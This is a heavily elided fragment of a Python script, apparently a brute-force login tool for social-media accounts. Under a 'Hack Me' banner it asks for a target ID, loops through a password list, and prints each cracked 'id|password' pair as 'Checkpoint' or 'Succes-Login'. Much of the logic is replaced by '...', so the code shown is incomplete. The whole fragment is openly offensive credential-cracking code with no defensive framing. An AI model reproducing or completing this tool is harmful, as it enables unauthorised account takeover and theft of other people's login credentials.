...
def pengikut():
	try:
		...
		exit()
	ses = requests.Session()
	cetak(panel(f"Hack 'Me' ",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' ╰─  Id Target : ')
	try:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}")
				cetak(tree)
				...
				tree = Tree(f"  ")
				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}")
				cetak(tree) 
